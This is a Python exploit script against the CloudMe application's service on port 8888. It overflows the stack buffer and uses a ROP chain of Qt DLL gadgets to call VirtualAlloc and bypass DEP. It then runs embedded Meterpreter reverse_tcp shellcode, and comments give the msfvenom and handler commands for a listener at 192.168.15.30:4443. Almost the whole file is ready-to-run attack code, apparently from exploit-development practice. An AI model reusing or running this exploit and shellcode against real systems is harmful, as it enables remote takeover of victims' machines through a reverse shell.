#!/usr/local/bin/python3

import sys
from socket import *
from struct import pack

total = 2500
offset = 1052

host = b"127.0.0.1"
port = 8888

def payload1() -> bytes:
    return b"A" * total

'''
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);

XXXXXXXX -> KERNEL32!VirtualAllocStub
YYYYYYYY -> Return address (Shellcode on the stack)
YYYYYYYY -> lpAddress (Shellcode on the stack)
00000001 -> dwSize
00001000 -> flAllocationType
00000040 -> flProtect
'''
def payload() -> bytes:
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.15.30 LPORT=4443 -f python -v shellcode
    # msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.15.30; set LPORT 4443; exploit"
    shellcode =  b""
    shellcode += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b"
    shellcode += b"\x52\x30\x8b\x52\x0c\x89\xe5\x8b\x52\x14\x0f"
    shellcode += b"\xb7\x4a\x26\x8b\x72\x28\x31\xff\x31\xc0\xac"
    shellcode += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
    shellcode += b"\x49\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x01"
    shellcode += b"\xd0\x8b\x40\x78\x57\x85\xc0\x74\x4c\x01\xd0"
    shellcode += b"\x8b\x58\x20\x8b\x48\x18\x50\x01\xd3\x85\xc9"
    shellcode += b"\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31"
    shellcode += b"\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4"
    shellcode += b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58"
    shellcode += b"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01"
    shellcode += b"\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
    shellcode += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
    shellcode += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
    shellcode += b"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
    shellcode += b"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29"
    shellcode += b"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a"
    shellcode += b"\x0a\x68\xc0\xa8\x0f\x1e\x68\x02\x00\x11\x5b"
    shellcode += b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68"
    shellcode += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57"
    shellcode += b"\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a"
    shellcode += b"\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a"
    shellcode += b"\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
    shellcode += b"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
    shellcode += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
    shellcode += b"\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
    shellcode += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28"
    shellcode += b"\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
    shellcode += b"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61"
    shellcode += b"\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
    shellcode += b"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6"
    shellcode += b"\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53"
    shellcode += b"\xff\xd5"                            

    # 00000000690398A0		VirtualAlloc	KERNEL32 -> QtCore.dll

    rop_chain = [
        #--  VirtualAlloc Address
        0x68af9c33, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll :: push esp ; pop ebx ; pop esi ; ret  ;
        0xffffffe0, # -0x20 => ESI
        0x61defd15, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: add ebx, esi ; ret  ;
        0x61b460dc, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: xchg eax, ebx ; ret  ;
        0x68be726b, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll :: xchg eax, ecx ; ret  ; => ESP -> ECX
        0x61b6122a, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: pop eax ; ret  ;
        0x690398A0, # IAT VirtualAlloc
        0x699030c5, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll :: mov eax, dword [eax] ; ret  ;
        0x6aaa04ec, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\platforms\qwindows.dll :: mov dword [ecx], eax ; ret  ; => WRITE on [ECX] the address of VirtualAlloc

        #-- Shellcode Return Address
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61ba4ca0, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: mov eax, ecx ; ret  ;
        0x61e30fe3, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: pop edx ; ret  ;
        0xfffffdf0, # -0x210
        0x61b5ba9c, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: sub eax, edx ; ret  ;
        0x6aaa04ec, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\platforms\qwindows.dll :: mov dword [ecx], eax ; ret  ; => WRITE on [ECX] the return address

        #-- Shellcode Address
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x6aaa04ec, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\platforms\qwindows.dll :: mov dword [ecx], eax ; ret  ; => WRITE on [ECX] the return address

        #-- dwSize = 0x1
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b6122a, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: pop eax ; ret  ;
        0xffffffff, # -1 (negated)
        0x61eed92a, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: neg eax ; ret  ;
        0x6aaa04ec, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\platforms\qwindows.dll :: mov dword [ecx], eax ; ret  ; => WRITE on [ECX] the return address

        #-- flAllocationType = 0x1000
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b6122a, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: pop eax ; ret  ;
        0xffffefff, # -1001 -> needs to convert to 1000 before store
        0x61eed92a, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: neg eax ; ret  ;
        0x61ba5ae5, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: dec eax ; ret  ;
        0x6aaa04ec, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\platforms\qwindows.dll :: mov dword [ecx], eax ; ret  ; => WRITE on [ECX] the return address

        #-- flProtect = 0x40
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b474f8, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: inc ecx ; ret  ;
        0x61b6122a, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: pop eax ; ret  ;
        0xffffffc0, # -0x40
        0x61eed92a, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: neg eax ; ret  ;
        0x6aaa04ec, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\platforms\qwindows.dll :: mov dword [ecx], eax ; ret  ; => WRITE on [ECX] the return address

        # 0:000> dds ecx - 14 L6
        # 00a3d3e4  755438c0 KERNEL32!VirtualAllocStub
        # 00a3d3e8  00a3d5f8
        # 00a3d3ec  00a3d5f8
        # 00a3d3f0  00000001
        # 00a3d3f4  00001000
        # 00a3d3f8  00000040

        0x61ba4ca0, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: mov eax, ecx ; ret  ;
        0x61e30fe3, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: pop edx ; ret  ;
        0xffffffec, # -0x14 (compensate the inc's)
        0x61be60bb, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: add eax, edx ; ret  ;
        0x61b7a15f, # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: xchg eax, esp ; ret  ;
    ]

    rop = b''.join(pack("<L", (_)) for _ in rop_chain)

    virtual_alloc_placeholder  = pack("<L", (0x45454545)) # VirtualAlloc Address
    virtual_alloc_placeholder += pack("<L", (0x46464646)) # Shellcode Return Address
    virtual_alloc_placeholder += pack("<L", (0x47474747)) # Shellcode Address
    virtual_alloc_placeholder += pack("<L", (0x48484848)) # dwSize
    virtual_alloc_placeholder += pack("<L", (0x49494949)) # flAllocationType
    virtual_alloc_placeholder += pack("<L", (0x51515151)) # flProtect

    payload  = b"\x41" * (offset - len(virtual_alloc_placeholder))
    payload += virtual_alloc_placeholder
    payload += pack('<L', 0x61b41526) # C:\Users\mwd\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll :: ret  ;
    payload += rop
    payload += b"\x90" * 0x124
    payload += shellcode
    payload += b"\x90" * (total - len(payload))

    return payload

def main():
    buf = payload()

    print ("\n[!] Connecting to %s:%s ..." % (host, port))

    s = socket(AF_INET, SOCK_STREAM)
    s.connect((host, port))

    print ("[!] Sending the packet...")

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)

if __name__ == "__main__":
    main()
